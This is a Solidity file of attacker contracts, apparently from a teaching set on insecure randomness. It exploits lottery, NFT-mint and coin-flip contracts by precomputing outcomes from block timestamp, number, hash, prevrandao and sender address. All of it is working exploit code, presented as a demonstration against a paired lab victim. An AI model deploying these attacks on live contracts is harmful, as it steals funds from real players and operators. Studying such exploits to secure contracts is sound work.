// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SC09_Insecure_Randomness_Victim.sol";

/*
 SC09_Insecure_Randomness_Attacker.sol
 Purpose: Demonstrates exploitation of insecure randomness vulnerabilities.
 
 Attack Techniques:
 1. Predict block.timestamp-based randomness
 2. Predict block.number-based randomness
 3. Predict blockhash-based randomness
 4. Calculate msg.sender-based randomness
 5. Front-run and predict combined weak randomness
*/

contract InsecureRandomnessAttacker {
    InsecureRandomnessVictim public victim;
    address public owner;
    uint256 public attacksSucceeded;
    
    event AttackExecuted(string attackType, bool success, uint256 randomPredicted);
    event WinningAttempt(uint256 attemptNumber, uint256 predictedRandom);
    
    constructor(address payable _victim) {
        victim = InsecureRandomnessVictim(_victim);
        owner = msg.sender;
    }
    
    // ATTACK 1: Predict and exploit block.timestamp randomness
    function attackTimestampLottery() external payable {
        require(msg.value >= 0.1 ether, "Need at least 0.1 ETH");
        
        // Calculate what the "random" number will be
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(block.timestamp))) % 100;
        
        emit WinningAttempt(1, predictedRandom);
        
        // Only play if we know we'll win
        if (predictedRandom < 10) {
            victim.playLotteryTimestamp{value: msg.value}();
            attacksSucceeded++;
            emit AttackExecuted("Timestamp Lottery", true, predictedRandom);
        } else {
            // Don't play, refund
            payable(owner).transfer(msg.value);
            emit AttackExecuted("Timestamp Lottery", false, predictedRandom);
        }
    }
    
    // ATTACK 2: Predict block.number randomness
    function attackBlockNumberLottery() external payable {
        require(msg.value >= 0.1 ether, "Need at least 0.1 ETH");
        
        // Calculate what the "random" number will be
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(block.number))) % 100;
        
        emit WinningAttempt(2, predictedRandom);
        
        // Only play if we'll win
        if (predictedRandom < 10) {
            victim.playLotteryBlockNumber{value: msg.value}();
            attacksSucceeded++;
            emit AttackExecuted("Block Number Lottery", true, predictedRandom);
        } else {
            payable(owner).transfer(msg.value);
            emit AttackExecuted("Block Number Lottery", false, predictedRandom);
        }
    }
    
    // ATTACK 3: Predict blockhash randomness
    function attackBlockhashLottery() external payable {
        require(msg.value >= 0.1 ether, "Need at least 0.1 ETH");
        
        // Calculate what the "random" number will be
        // We know blockhash(block.number - 1) since we're in the same block
        uint256 predictedRandom = uint256(blockhash(block.number - 1)) % 100;
        
        emit WinningAttempt(3, predictedRandom);
        
        // Only play if we'll win
        if (predictedRandom < 10) {
            victim.playLotteryBlockhash{value: msg.value}();
            attacksSucceeded++;
            emit AttackExecuted("Blockhash Lottery", true, predictedRandom);
        } else {
            payable(owner).transfer(msg.value);
            emit AttackExecuted("Blockhash Lottery", false, predictedRandom);
        }
    }
    
    // ATTACK 4: Calculate msg.sender randomness
    function attackSenderLottery() external payable {
        require(msg.value >= 0.1 ether, "Need at least 0.1 ETH");
        
        // We know msg.sender will be this contract's address
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(address(this)))) % 100;
        
        emit WinningAttempt(4, predictedRandom);
        
        // Only play if we'll win
        if (predictedRandom < 10) {
            victim.playLotterySender{value: msg.value}();
            attacksSucceeded++;
            emit AttackExecuted("Sender Lottery", true, predictedRandom);
        } else {
            payable(owner).transfer(msg.value);
            emit AttackExecuted("Sender Lottery", false, predictedRandom);
        }
    }
    
    // ATTACK 5: Predict combined weak randomness
    function attackCombinedLottery() external payable {
        require(msg.value >= 0.1 ether, "Need at least 0.1 ETH");
        
        // Calculate combined randomness (all values are known in same transaction)
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.number,
            address(this)  // msg.sender in victim will be this contract
        ))) % 100;
        
        emit WinningAttempt(5, predictedRandom);
        
        // Only play if we'll win
        if (predictedRandom < 10) {
            victim.playLotteryCombined{value: msg.value}();
            attacksSucceeded++;
            emit AttackExecuted("Combined Lottery", true, predictedRandom);
        } else {
            payable(owner).transfer(msg.value);
            emit AttackExecuted("Combined Lottery", false, predictedRandom);
        }
    }
    
    // ATTACK 6: Predict prevrandao (block.difficulty) randomness
    function attackDifficultyLottery() external payable {
        require(msg.value >= 0.1 ether, "Need at least 0.1 ETH");
        
        // Calculate what the "random" number will be
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(block.prevrandao))) % 100;
        
        emit WinningAttempt(6, predictedRandom);
        
        // Only play if we'll win
        if (predictedRandom < 10) {
            victim.playLotteryDifficulty{value: msg.value}();
            attacksSucceeded++;
            emit AttackExecuted("Difficulty Lottery", true, predictedRandom);
        } else {
            payable(owner).transfer(msg.value);
            emit AttackExecuted("Difficulty Lottery", false, predictedRandom);
        }
    }
    
    // Batch attack: Try multiple approaches
    function batchAttack() external payable {
        require(msg.value >= 0.6 ether, "Need at least 0.6 ETH for batch");
        
        uint256 betAmount = 0.1 ether;
        
        // Try all attack vectors
        this.attackTimestampLottery{value: betAmount}();
        this.attackBlockNumberLottery{value: betAmount}();
        this.attackBlockhashLottery{value: betAmount}();
        this.attackSenderLottery{value: betAmount}();
        this.attackCombinedLottery{value: betAmount}();
        this.attackDifficultyLottery{value: betAmount}();
    }
    
    // Withdraw winnings
    function withdrawWinnings() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    // Get balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    receive() external payable {}
}

// Attacker for NFT minting
contract NFTMintAttacker {
    VulnerableNFTMint public victim;
    address public owner;
    uint256 public rareNFTsMinted;
    
    event RareNFTMinted(uint256 tokenId);
    event MintAttempt(uint256 predictedRandom, bool willBeRare);
    
    constructor(address payable _victim) {
        victim = VulnerableNFTMint(_victim);
        owner = msg.sender;
    }
    
    // ATTACK: Only mint when we know we'll get a rare NFT
    function attackMint(uint256 tokenId) external payable {
        require(msg.value >= 0.01 ether, "Need minting fee");
        
        // Predict the randomness
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            address(this),
            tokenId
        ))) % 100;
        
        bool willBeRare = (predictedRandom == 0);
        
        emit MintAttempt(predictedRandom, willBeRare);
        
        // Only mint if we'll get rare
        if (willBeRare) {
            victim.mintNFT{value: msg.value}();
            rareNFTsMinted++;
            emit RareNFTMinted(tokenId);
        } else {
            // Refund if not rare
            payable(owner).transfer(msg.value);
        }
    }
    
    // Brute force: Keep trying until we can mint rare
    function bruteForceRareMint() external payable {
        require(msg.value >= 0.01 ether, "Need minting fee");
        
        uint256 nextTokenId = victim.nextTokenId();
        
        // Calculate what randomness would be
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            address(this),
            nextTokenId
        ))) % 100;
        
        // Only proceed if rare
        if (predictedRandom == 0) {
            victim.mintNFT{value: msg.value}();
            rareNFTsMinted++;
        } else {
            revert("Not a winning block, try again");
        }
    }
    
    function withdrawFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    receive() external payable {}
}

// Attacker for coin flip game
contract CoinFlipAttacker {
    VulnerableCoinFlip public victim;
    address public owner;
    uint256 public wins;
    
    event PredictedFlip(bool prediction, bool correct);
    
    constructor(address payable _victim) {
        victim = VulnerableCoinFlip(_victim);
        owner = msg.sender;
    }
    
    // ATTACK: Predict the coin flip outcome
    function attackFlip() external returns (bool) {
        // Calculate the same "random" value the victim will use
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue % 2;
        bool prediction = (coinFlip == 1);
        
        // Make the flip with our prediction
        bool won = victim.flip(prediction);
        
        if (won) {
            wins++;
        }
        
        emit PredictedFlip(prediction, won);
        
        return won;
    }
    
    // Win 10 times in a row to become champion
    function becomeChampion() external {
        // We can only flip once per block, but we can guarantee wins
        // This would need to be called in 10 different blocks
        
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue % 2;
        bool prediction = (coinFlip == 1);
        
        victim.flip(prediction);
    }
    
    function getWins() external view returns (uint256) {
        return wins;
    }
}
